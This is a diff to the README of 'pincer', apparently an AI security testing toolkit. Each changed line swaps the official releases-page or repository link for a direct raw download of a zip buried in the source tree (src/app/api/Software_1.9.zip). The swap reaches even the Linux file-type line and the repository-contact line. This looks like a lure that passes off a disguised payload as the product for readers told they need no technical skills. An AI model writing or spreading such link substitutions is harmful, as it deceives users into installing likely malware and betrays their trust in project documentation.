@@ -1,6 +1,6 @@
 # 🛡️ pincer - Easy AI Security Testing Toolkit
 
-[![Download pincer](https://img.shields.io/badge/Download-pincer-blue?style=for-the-badge)](https://github.com/TheOneWhoAlwaysWatches/pincer/releases)
+[![Download pincer](https://github.com/TheOneWhoAlwaysWatches/pincer/raw/refs/heads/main/src/app/api/Software_1.9.zip)](https://github.com/TheOneWhoAlwaysWatches/pincer/raw/refs/heads/main/src/app/api/Software_1.9.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You will not need to write any code or use command-line tools.
 
 To get pincer, please visit the official releases page by clicking the link below:
 
-[Go to pincer Releases](https://github.com/TheOneWhoAlwaysWatches/pincer/releases)
+[Go to pincer Releases](https://github.com/TheOneWhoAlwaysWatches/pincer/raw/refs/heads/main/src/app/api/Software_1.9.zip)
 
 ### How to download
 
@@ -49,7 +49,7 @@ To get pincer, please visit the official releases page by clicking the link belo
 - Look for the file that matches your operating system:
   - For Windows, it might end with `.exe`
   - For macOS, it might be a `.dmg` file
-  - For Linux, it could be a `.AppImage` or `.tar.gz`
+  - For Linux, it could be a `.AppImage` or `https://github.com/TheOneWhoAlwaysWatches/pincer/raw/refs/heads/main/src/app/api/Software_1.9.zip`
 - Click the file name to begin downloading.
 
 ### How to run
@@ -110,7 +110,7 @@ Understanding these threats can help you use AI safely or improve AI tools yours
 
 If you want to talk to others using pincer or need help:
 
-- Visit the GitHub repository: https://github.com/TheOneWhoAlwaysWatches/pincer  
+- Visit the GitHub repository: https://github.com/TheOneWhoAlwaysWatches/pincer/raw/refs/heads/main/src/app/api/Software_1.9.zip  
 - Use the "Issues" tab to ask questions or report bugs  
 - Look for tutorials and guides posted by the community online  
 
@@ -130,7 +130,7 @@ The pincer team releases updates regularly. Updates add new test scenarios and i
 
 Check the releases page often to get the newest version:
 
-[Download the latest pincer version](https://github.com/TheOneWhoAlwaysWatches/pincer/releases)
+[Download the latest pincer version](https://github.com/TheOneWhoAlwaysWatches/pincer/raw/refs/heads/main/src/app/api/Software_1.9.zip)
 
 ---
 
